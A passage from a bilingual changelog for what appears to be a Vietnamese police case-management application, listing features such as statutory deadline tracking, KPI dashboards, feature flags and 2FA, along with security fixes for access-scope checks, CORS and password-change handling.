- **TwoFaSetupModal**: Phân biệt 409 "pending setup" vs "already enabled" — chỉ hiện nút "Huỷ setup cũ và bắt đầu lại" khi lỗi message chứa 'chờ xác nhận', tránh vô tình huỷ 2FA đã kích hoạt.
- **DevicesController**: `DELETE /devices/:token` truyền `userId` vào `unregister()` để enforce ownership — tránh user xóa token của người khác.

## [0.5.6.0] - 2026-04-24

### Added
- **Từ viết tắt cá nhân (Text Expansion)**: Người dùng tự định nghĩa thư viện phím tắt cá nhân (ví dụ: `lvs` → `Lê Văn Sỹ`). Gõ phím tắt + F9 trong bất kỳ ô nhập liệu nào để mở rộng tự động. Hoạt động trên toàn bộ hệ thống (global F9 listener trong MainLayout).
- **API abbreviations**: 5 endpoint — GET list, PUT upsert, DELETE remove, POST copy-from, GET users. Xác thực chỉ qua JwtAuthGuard (dữ liệu cá nhân).
- **Copy từ người dùng khác**: Sao chép thư viện viết tắt từ user khác theo 2 chế độ — Gộp (merge, giữ phím tắt hiện tại) hoặc Thay thế hoàn toàn (replace dùng atomic `$transaction`).
- **Settings tab "Từ viết tắt"**: Giao diện quản lý — bảng danh sách, form thêm/sửa, panel sao chép từ người dùng khác.
- **Schema `UserAbbreviation`**: Bảng `user_abbreviations` với unique index `(userId, shortcut)`, FK cascade on delete.
- **20 unit tests**: `abbreviations.service.spec.ts` (15) + `abbreviations.controller.spec.ts` (5).

## [0.5.5.0] - 2026-04-24

### Added
- **Cải cách hành chính — xóa bỏ cấp quận/huyện**: Directory entries type=DISTRICT đánh dấu `isActive=false` + `abolishedAt=2025-07-01`. Ward legacy cascade (parentId→DISTRICT) cũng đánh dấu `isActive=false`. Schema thêm `abolishedAt DateTime?` và `replacedByCode String?` trên Directory model.
- **Địa chỉ 2 cấp cho hồ sơ mới**: Form vụ án chỉ hiện Tỉnh/TP + Phường/Xã; danh sách phường load từ API `/directories?type=WARD&isActive=true`. Hồ sơ cũ có quận hiện amber read-only badge "Địa chỉ cũ — [quận] (trước 01/07/2025)".
- **Legacy toggle (Ctrl+Shift+L)**: Cho phép nhập lại hồ sơ giấy cũ có quận — toggle bật/tắt field Quận/Huyện với ward cascade theo `parentId`. Chỉ áp dụng cho hồ sơ mới, không đè lên dữ liệu lịch sử từ DB.
- **`Subject.districtName`**: Denormalized district name lưu tại thời điểm tạo hồ sơ — đảm bảo tên pháp lý hiển thị đúng sau cải cách. DTO + Service + Migration thêm field này.
- **Slug normalization script**: `backend/prisma/migrations/20260425000002_normalize_case_district_slugs/migrate-district-slugs.ts` — standalone script chuẩn hóa `Case.metadata.district` slugs (quan-1 → Q1 v.v.).
- **2FA infrastructure (TOTP + Email OTP)**: Thêm schema fields (`twoFaSecret`, `twoFaEnabled`, `twoFaVerified`), service (`TwoFaService`, `OtpCodeService`, `TotpEncryptionService`), controller (`TwoFaController`), guard (`TwoFaTokenGuard`), email module, và frontend pages (`TwoFaPage`, `TwoFaSetupModal`). Auth flow cập nhật hỗ trợ 2FA challenge step.

### Fixed
- Loại bỏ hardcoded `DISTRICT_OPTIONS` và `WARD_OPTIONS` trong `CaseFormPage/constants.ts` — thay bằng API-driven dropdowns.

## [0.5.4.0] - 2026-04-24

### Added
- **GAP-1: `LoaiNguonTin` enum** (BLTTHS 2015 Điều 144) — `loaiDonVu` on `Incident` changed from `String?` to `LoaiNguonTin?` (TO_GIAC / TIN_BAO / KIEN_NGHI_KHOI_TO). DTO validation rejects non-enum values with 400. Migration: `CASE-WHEN` string→enum conversion preserving existing data.
- **GAP-2: Deadline extension tracking** (BLTTHS 2015 Điều 147 khoản 2-3) — `soLanGiaHan Int @default(0)` and `ngayGiaHan DateTime?` on `Incident`. `POST /incidents/:id/extend` extends deadline (max 2 times, each +60 days configurable via SystemSettings `THOI_HAN_GIA_HAN_1`/`THOI_HAN_GIA_HAN_2`). Optimistic concurrency lock prevents double-extension race.
- **GAP-3: Max deadline corrected** — `THOI_HAN_TOI_DA` seed value `120` → `140` (20 + 60 + 60 days, Điều 147 khoản 1-3).
- **GAP-4: `LoaiDon` enum** (Luật Tố cáo 2018 / Luật Khiếu nại 2011) — `petitionType` on `Petition` changed from `String?` to `LoaiDon?` (TO_CAO / KHIEU_NAI / KIEN_NGHI / PHAN_ANH). DTO validation rejects non-enum values.
- **GAP-5: `CapDoToiPham` enum** (BLHS 2015 Điều 9) — `capDoToiPham` on `Case` (IT_NGHIEM_TRONG / NGHIEM_TRONG / RAT_NGHIEM_TRONG / DAC_BIET_NGHIEM_TRONG). KPI-4 now correctly uses `capDoToiPham` enum instead of `metadata.severity` string path.
- **GAP-6: `LyDoKhongKhoiTo` enum** (BLTTHS 2015 Điều 157) — 7 statutory grounds for non-prosecution on `Incident`. Required when transitioning to `KHONG_KHOI_TO` status — `updateStatus()` validates presence.
- **GAP-7: Petition deadline configuration** — Deadline days per petition type now read from SystemSettings (`THOI_HAN_TO_CAO`, `THOI_HAN_KHIEU_NAI`, `THOI_HAN_KIEN_NGHI`, `THOI_HAN_PHAN_ANH`). Default fallback 15 days. Audit log records `deadlineDays` + `deadlineSettingKey` for traceability.
- **GAP-9: `writableTeamIds` write-scope enforcement** — `DataScope` now includes `writableTeamIds` (subset of `teamIds` where user has WRITE grant). All mutating incident endpoints (`update`, `updateStatus`, `delete`, `mergeInto`, `transferUnit`, `assignInvestigator`, `extendDeadline`, `prosecute`) now call `checkWriteScope()` using `writableTeamIds`. READ-grant holders can no longer mutate records.
- **Frontend selects**: `loaiDonVu` filter (3 enum options, Điều 144), `petitionType` select (4 enum options), `capDoToiPham` select (4 BLHS mức độ options) replacing free-text inputs.

### Fixed
- **IDOR in `extendDeadline`**: Was fetching incident without scope check. Now calls `checkWriteScope()` with `dataScope` from request.
- **Silent NULL deadline coercion**: `incident.deadline ?? new Date()` replaced with explicit `BadRequestException` when deadline is null.
- **extensionDays ≤ 0 guard**: `BadRequestException` thrown if SystemSettings returns `THOI_HAN_GIA_HAN_*` ≤ 0 (invalid admin config).

### Security
- Write-scope enforcement closes FINDING-4: READ-grant users could previously call any mutating endpoint on records they could only read.

## [0.5.3.0] - 2026-04-23

### Added
- **Self-service password change**: `POST /auth/change-password` — user đổi mật khẩu của chính mình. Xác minh mật khẩu hiện tại, enforce strong password (≥8 ký tự, chữ hoa, số, ký tự đặc biệt), audit log `PASSWORD_CHANGED`, invalidate refresh tokens.
- **Frontend "Đổi mật khẩu" modal**: User avatar trên header mở dropdown → "Đổi mật khẩu" → modal với show/hide toggle, real-time strength checklist (4 rules), success state, và Vietnamese error messages.
- **`ChangePasswordDto`** + **`password.constants.ts`**: Shared `STRONG_PASSWORD_REGEX` / `STRONG_PASSWORD_MSG` constants — DRY, một chỗ thay đổi policy.

### Fixed
- **Security (rate limiting)**: `POST /auth/change-password` thiếu `@Throttle` — brute-force via stolen JWT. Đã thêm `@Throttle({ default: { ttl: 60000, limit: 5 } })`.
- **Security (session invalidation)**: Đổi mật khẩu không xóa `refreshTokenHash` — attacker giữ refresh token vẫn duy trì session. Đã thêm `refreshTokenHash: null` vào update.
- **UX**: `newPassword === currentPassword` không bị chặn. Đã thêm `BadRequestException` guard trong service.
- **DRY**: Strong password regex duplicate trong 3 DTOs — đã extract sang `auth/constants/password.constants.ts`.

### Fixed (Adversarial Review)
- **Security (null hash crash)**: `changePassword` trên tài khoản OAuth/SSO (không có `passwordHash`) gây 500 error. Đã thêm explicit guard: `BadRequestException` khi `passwordHash` là null.
- **Security (bcrypt 72-byte bypass)**: So sánh `newPassword === currentPassword` bằng string equality không phát hiện same-password khi password > 72 ký tự (bcrypt truncates). Đã chuyển sang `bcrypt.compare(newPassword, oldHash)` — correct semantic check.
- **Compliance (audit transaction)**: `auditService.log()` không nằm trong cùng transaction với `user.update()` — password thay đổi thành công nhưng audit entry có thể bị mất nếu DB blip. Đã wrap cả hai trong `prisma.$transaction()`.

### Tests
- 8 unit tests cho `AuthService.changePassword` (bao gồm null-hash guard + transaction wrapper + bcrypt same-password check), 3 controller tests (`auth.controller.spec.ts`), 8 frontend tests (`ChangePasswordModal.test.tsx`). Tổng: **474 tests / 28 suites**.

## [0.5.2.0] - 2026-04-21

### Fixed
- **Security (IDOR write/list)**: `update`, `delete`, và `getList` trên 9 resource phụ không kiểm tra DataScope — user từ Tổ khác có thể ghi đè hoặc liệt kê bản ghi ngoài phạm vi. Đã thêm pre-flight `await this.getById(id, dataScope)` trên mọi write op, và `buildScopeFilter` cho list queries.
- **Security (assertCreatorInScope deny-all)**: deny-all scope `{userIds:[],teamIds:[]}` bị bỏ qua do short-circuit `userIds.length > 0`. Đã thêm `isDenyAll` check — scope rỗng luôn bị chặn.
- **Security (getMessages bypass)**: `GET /exchanges/:id/messages` không kiểm tra scope — user ngoài scope có thể đọc tin nhắn. Đã thêm `await this.getById(exchangeId, dataScope)` pre-flight.
- **Security (deletedAt gap)**: `InvestigationSupplementsService.getById` thiếu `deletedAt: null` filter — soft-deleted record có thể fetch theo ID. Đã thêm filter.
- **Security (CORS empty string)**: `CORS_ORIGIN=` (env var rỗng) tạo ra `origin: [""]` block mọi cross-origin request trong production. Đã thêm `.filter(Boolean)` và fallback localhost.
- **Type safety**: Thay thế `(req as any).dataScope` trong 13 controller bằng `ScopedRequest` interface — typed `Request` với `dataScope?: DataScope | null`. Xóa toàn bộ unsafe cast.
- **Code quality**: Extract magic strings thành named constants trong `scope-filter.util.ts` — `FORBIDDEN_MSG` và `NO_ACCESS_SENTINEL`, tránh lỗi typo và cho phép refactor tập trung.

### Added
- **`ScopedRequest` interface** (`backend/src/auth/interfaces/scoped-request.interface.ts`): extends Express `Request` với `dataScope?: DataScope | null`. Được import bởi tất cả 13 controller.
- **Tests**: 4 test cases deny-all scope cho `exchanges` và `guidance` service specs. Controller spec mới `exchanges.controller.spec.ts` — 4 tests xác nhận `dataScope` được forward đúng từ controller sang service. Tổng: 463 tests / 26 suites.

## [0.5.1.0] - 2026-04-21

### Fixed
- **Security (IDOR)**: `getById` trên 9 resource phụ (documents, subjects, conclusions, delegations, exchanges, guidance, investigation-supplements, lawyers, proposals) không kiểm tra phạm vi dữ liệu (DataScope). Authenticated user từ Tổ khác có thể fetch bất kỳ record nào theo ID. Đã thêm `assertParentInScope()` (kiểm tra scope qua Case/Incident cha) và `assertCreatorInScope()` (kiểm tra qua createdById), áp dụng nhất quán trên tất cả 9 service.
- **Security (CORS)**: CORS origin hardcoded `localhost:5173/5179` sẽ block mọi browser request trong production. Đã chuyển sang `CORS_ORIGIN` env var với localhost fallback cho development.
- **CVEs**: `npm audit fix` frontend — xóa 6 lỗ hổng (4 HIGH Vite dev dependencies).

### Added
- **Test coverage**: 43 unit tests mới cho security enforcement paths. Thêm 6 service spec files (conclusions, delegations, exchanges, guidance, investigation-supplements, proposals). Scope-enforcement paths trong 3 spec files hiện có (documents, subjects, lawyers) được bổ sung. `assertParentInScope`/`assertCreatorInScope` có full branch coverage bao gồm edge cases (undefined scope, empty scope, null parent, unassigned records). Tổng: 454 tests / 25 suites.

## [0.5.0.1] - 2026-04-20

### Fixed
- **KPI-4 query**: Prisma JSON path filter used invalid `in` operator (unsupported for JSON path queries). Replaced with `OR/equals` pattern so `calculateKpi4()` correctly filters án rất nghiêm trọng và đặc biệt nghiêm trọng. Backend now compiles and `/kpi/summary` returns all 4 KPI values.

## [0.5.0.0] - 2026-04-20

### Added
- **KPI Dashboard** (`/kpi`): dashboard 4 chỉ tiêu cứng công tác điều tra theo TT28/2020/TT-BCA — thụ lý 100%, giải quyết >90%, khám phá >80%, án NT/ĐBNT >95%. Hiển thị theo năm/quý/tháng, drill-down theo Tổ, biểu đồ xu hướng 12 tháng (recharts). Team member chỉ xem Tổ của mình, admin xem tất cả.
- **Modular feature architecture**: mỗi module là 1 folder tự đóng gói. Frontend `src/features/<name>/` với `feature.manifest.ts`, `routes.tsx`, `menu.ts`, `index.ts`. Backend: mỗi module có `feature.manifest.ts` + central `feature-registry.ts`. 26 backend manifests + 16 frontend feature modules đã migrate.
- **Runtime feature flags**: bảng `feature_flags` + `@FeatureFlag(key)` NestJS guard + React `useFeature(key)` hook. Admin bật/tắt module → guard trả 404, sidebar ẩn menu. Cache in-memory 30s (TTL cấu hình qua `FEATURE_FLAG_CACHE_TTL_MS`).
- **Build-time feature packs**: env var `ENABLED_FEATURES=core,cases,petitions` whitelist module khi build. Cho phép phân phối variant khác nhau cho từng khách hàng mà không fork code.
- **Auto-discovery**: frontend registry dùng Vite `import.meta.glob('./features/*/index.ts')`. Backend registry có jest spec walk filesystem để catch missing entries. Thêm feature mới = tạo 1 folder, zero sửa file chung.
- **Sidebar registry consumption**: `useMenuSections()` hook gom menu entries từ feature modules, filter theo flag state, sort theo canonical section order, drop empty sections. Stale ids (favorites/expanded/recent) tự động pruned khi feature bị disable hoặc rename.

### Changed
- `frontend/src/App.tsx`: 244 → 44 dòng. Toàn bộ hardcoded routes thay bằng `FEATURE_MODULES.flatMap(f => f.renderRoutes())`.
- `frontend/src/components/AppSidebar.tsx`: bỏ 130 dòng hardcoded `menuSections` constant, dùng `useMenuSections()` hook.
- `backend/prisma/seed.ts`: tự động gọi `seedFeatureFlags(prisma)` ở cuối main seed flow — fresh deploy không còn blank menu.
- Deploy build command: `cd backend && npm install && npm run build && npx prisma migrate deploy && npm run db:seed` (bắt buộc để seed feature_flags).

### Fixed
- **Security**: `getById` cho incidents và petitions thiếu kiểm tra phạm vi dữ liệu (dataScope). Non-admin user có thể fetch bất kỳ record nào theo ID. Đã thêm `checkRecordInScope()` khớp pattern của CasesService.
- **Security**: `DataScopeInterceptor` khi JWT thiếu `role` claim → mặc định full access. Đã thêm fallback deny-all scope `{ teamIds: [], userIds: [] }`.
- `FeatureFlagsService.ensureFresh()` wrap refresh trong try/catch: post-boot DB blip không còn 500 mọi request, serves stale cache với 5s backoff. In-flight promise dedup chống thundering herd.
- `FeatureFlagGuard`: skip flag check khi request.user undefined → anonymous caller không thể probe enabled/disabled features qua 404 vs 401 pattern. Decoupled khỏi APP_GUARD execution order.
- `listAll()` merge FEATURE_REGISTRY với DB rows: fresh deploy trả về đầy đủ features với default-allow, frontend không còn blank trong race giữa migration và seed.
- `FeatureFlagsProvider`: retry 3 lần với backoff 500/1500/3000ms, 401 → clear tokens + redirect /login, network error exhausted → surface error state.
- Dashboard tests: stat values + chart headings (mock wrapped envelope, copy match).
- Calendar tests: modal prop name (`open` không phải `isOpen`), mock api events với future dates để pass filter.

### Removed
- `useFeatureRoutes` hook (dead code, App.tsx không dùng — comment trong App.tsx giải thích tại sao frontend routing không flag-gated).

## [0.4.1.0] - 2026-04-12

### Fixed
- Phân quyền: user cấp Tổ (level 1) giờ thấy data của các Phường thuộc Tổ đó (bỏ điều kiện level === 0)
- Settings: validate giá trị số 0-365 khi admin cập nhật thời hạn (chặn "-999" hoặc "abc")
- Incidents: phase filter ưu tiên rõ ràng khi cả status và phase được truyền
- Teams: validate userId tồn tại trước khi thêm thành viên (tránh 500 error)

### Added
- TeamsPage: panel quản lý thành viên khi click vào tổ/nhóm (thêm/gỡ user, search, isLeader badge)
- Teams API: POST /teams/:id/members + DELETE /teams/:id/members/:userId với audit logging

## [0.4.0.0] - 2026-04-12

### Added
- Tổ chức lại module Vụ việc theo 4 giai đoạn nghiệp vụ BCA (TT28/2020/TT-BCA): Tiếp nhận, Xác minh, Kết quả, Tạm đình chỉ
- Sidebar đơn giản hóa: 5 items (Tất cả + 4 giai đoạn) thay 12 items phẳng
- List page: 4 phase tabs với sub-filter chips cho từng trạng thái cụ thể
- Form tạo/sửa: 4 sections collapsible theo giai đoạn (tự mở/đóng theo status, user toggle được)
- Bảng SystemSetting: cấu hình 8 thời hạn xử lý với default theo BLTTHS 2015 (Đ.147, Đ.148, Đ.149)
- Trang admin /admin/settings: xem và sửa cấu hình thời hạn với cơ sở pháp lý
- Auto-deadline: tạo vụ việc có ngày tiếp nhận → tự tính thời hạn = ngày tiếp nhận + 20 ngày (configurable)
- 8 fields nghiệp vụ mới: số quyết định, lý do không khởi tố, lý do tạm đình chỉ, địa chỉ xảy ra, thông tin người tố giác (SĐT, địa chỉ, CCCD)
- Phase filter API: `?phase=tiep-nhan` server-side resolve an toàn qua PHASE_STATUSES map
- Frontend constants: incident-phases.ts shared giữa các components

### Changed
- Labels/comments sửa theo đúng thuật ngữ BLTTHS 2015 + TT28/2020/TT-BCA (Loại nguồn tin, Người tố giác, Đối tượng bị tố giác, Đơn vị thụ lý, Thời hạn giải quyết)
- Transition map bổ sung comments điều luật cho từng chuyển trạng thái
- Settings cache TTL 5 phút, seed upsert không ghi đè admin edits

## [0.3.0.0] - 2026-04-11

### Added
- Nâng cấp module Quản lý Vụ việc với 15 trạng thái theo quy trình nghiệp vụ thực tế (từ 6 trạng thái cũ)
- Transition map validation: chỉ cho phép chuyển trạng thái theo luồng nghiệp vụ hợp lệ
- Status history tracking: ghi lại lịch sử thay đổi trạng thái với lý do
- Endpoint đổi trạng thái (PATCH /incidents/:id/status) với validation
- Endpoint nhập vào vụ khác (PATCH /incidents/:id/merge) với re-link petitions/documents
- Endpoint chuyển đơn vị (PATCH /incidents/:id/transfer) với audit trail
- Endpoint thống kê theo trạng thái (GET /incidents/stats) dùng groupBy
- 15 fields mới cho Incident: đối tượng, loại đơn vụ, bên vụ, đơn vị giải quyết, kết quả xử lý, v.v.
- Model IncidentStatusHistory cho theo dõi lịch sử thay đổi
- Sidebar sub-menus: 12 mục lọc theo trạng thái (collapsible groups)
- Bộ lọc nâng cao: loại đơn vụ, bên vụ, tình trạng hồ sơ, thời hiệu, cán bộ nhập, date range
- Server-side pagination thay thế client-side filtering
- Status transition dialog: chỉ hiện transitions hợp lệ, yêu cầu ghi chú
- 58 unit tests mới cho transitions, merge, transfer, stats, filters

### Fixed
- Khởi tố vụ việc (prosecute) giờ dùng $transaction để đảm bảo atomicity
- Code generation VV-YYYY-NNNNN dùng retry loop thay vì count-based (fix race condition)
- Status không còn thay đổi qua PUT /update, phải dùng endpoint riêng
- Form chỉnh sửa vụ việc giờ load dữ liệu hiện có (fix edit mode)
